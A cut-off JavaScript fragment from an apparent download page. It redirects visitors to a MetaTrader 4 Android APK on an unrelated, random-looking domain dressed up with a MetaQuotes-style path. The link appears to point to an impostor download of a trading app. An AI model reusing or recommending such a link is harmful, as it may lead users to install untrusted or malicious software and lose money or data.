; $(document).ready(function () {
    ...
    if (system === 'download_mt4') {
        window.location.href = "https://dlmt4.uytregfds.com/cdn/web/metaquotes.software.corp/mt4/metatrader4.apk?utm_source=www.metatrader4.com&utm_campaign=download";
    } else {
        setTimeout(function () {
            if (platform) {
                if (platform == 'android') {
